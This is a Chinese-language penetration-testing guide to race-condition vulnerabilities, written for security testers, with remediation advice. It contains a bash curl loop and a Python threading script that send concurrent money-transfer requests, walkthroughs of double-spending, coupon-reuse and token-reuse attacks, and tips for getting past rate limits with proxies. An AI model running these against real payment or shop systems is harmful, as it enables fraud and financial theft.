# 竞争条件攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的竞争条件漏洞检测和利用流程。

## 1.2 适用范围

本文档适用于所有处理并发请求的 Web 应用，特别是金融、电商、票务等系统。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

竞争条件（Race Condition）是指多个操作并发执行时，由于执行顺序不确定，导致系统状态不一致的漏洞。

**本质问题**：
- 缺少并发控制
- 检查与操作非原子性（TOCTOU）
- 共享资源无锁保护

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-362 | 并发执行共享资源的同步问题 |
| CWE-367 | 时间窗口检查（TOCTOU） |
| CWE-820 | 缺少同步 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险点 | 潜在危害 |
|---------|-------|---------|
| 支付系统 | 并发转账 | 双重支付、资金丢失 |
| 电商系统 | 并发下单 | 超卖、库存不一致 |
| 票务系统 | 并发选座 | 重复出票 |
| 优惠券 | 并发使用 | 重复使用 |
| 积分系统 | 并发兑换 | 积分超发 |
| 密码重置 | 并发请求 | Token 重用 |

## 2.3 漏洞发现方法

### 2.3.1 并发请求测试

```bash
# 使用 Burp Suite Turbo Intruder
# 或使用自定义脚本

# 并发发送相同请求
for i in {1..10}; do
    curl -X POST https://target.com/api/transfer \
        -d "amount=100&to=account1" &
done
wait

# 检查是否所有请求都成功
# 余额是否正确扣减
```

### 2.3.2 TOCTOU 检测

```
Time-of-Check to Time-of-Use 模式：

1. 检查条件（余额是否足够）
2. [时间窗口]
3. 执行操作（扣减余额）

攻击者在时间窗口内发起多个请求
```

### 2.3.3 自动化测试脚本

```python
import requests
import threading

def transfer():
    response = requests.post(
        'https://target.com/api/transfer',
        json={'amount': 100, 'to': 'attacker'}
    )
    print(response.status_code)

# 并发发起 50 个请求
threads = []
for _ in range(50):
    t = threading.Thread(target=transfer)
    threads.append(t)

# 同时启动
for t in threads:
    t.start()

for t in threads:
    t.join()
```

## 2.4 漏洞利用方法

### 2.4.1 双重支付攻击

```
场景：账户余额 100 元

攻击：
1. 并发发起两笔 100 元转账
2. 两笔请求都通过余额检查
3. 两笔都执行扣款
4. 结果：余额 -100 元，攻击者获得 200 元
```

### 2.4.2 库存超卖攻击

```
场景：限量商品 10 件

攻击：
1. 使用 100 个并发请求下单
2. 每个请求都检查库存 > 0
3. 所有请求都成功下单
4. 结果：卖出 100 件，实际只有 10 件
```

### 2.4.3 优惠券重复使用

```
场景：一次性优惠券

攻击：
1. 并发使用同一优惠券
2. 每个请求检查优惠券未使用
3. 所有请求都成功应用优惠
4. 结果：优惠券被多次使用
```

### 2.4.4 密码重置 Token 重用

```
场景：一次性密码重置 Token

攻击：
1. 获取重置 Token
2. 并发发起多个重置请求
3. 如果 Token 验证非原子性
4. 结果：Token 被多次使用
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

```bash
# 使用多个 IP/代理
# 分布式并发请求

# 每个 IP 低于速率限制阈值
# 但总体达到并发效果
```

### 2.5.2 事务边界探测

```bash
# 测试不同操作的原子性边界
# 找到可以插入并发请求的时间点

# 例如：
# 1. 在检查后、扣款前插入
# 2. 在扣款后、记录前插入
```

### 2.5.3 精确时序攻击

```python
# 精确控制请求时序
import time

def attack():
    # 在特定时间点发送请求
    time.sleep(0.001)  # 1 毫秒精度
    send_request()

# 需要多次测试确定最佳时机
```

---

# 第三部分：附录

## 3.1 竞争条件测试检查清单

```
□ 测试并发转账
□ 测试并发下单
□ 测试并发优惠券使用
□ 测试并发 Token 使用
□ 检查事务隔离级别
□ 检查锁机制
□ 测试 TOCTOU 漏洞
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Turbo Intruder | 高速并发请求 | Burp 扩展 |
| 自定义 Python 脚本 | 并发测试 | threading 模块 |
| JMeter | 压力测试 | https://jmeter.apache.org/ |

## 3.3 修复建议

1. **数据库事务** - 使用适当的事务隔离级别
2. **乐观锁** - 使用版本号控制
3. **悲观锁** - SELECT FOR UPDATE
4. **队列处理** - 串行化处理请求
5. **幂等性** - 确保操作可重复执行

---

**参考资源**：
- [OWASP Testing for Race Conditions](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions)
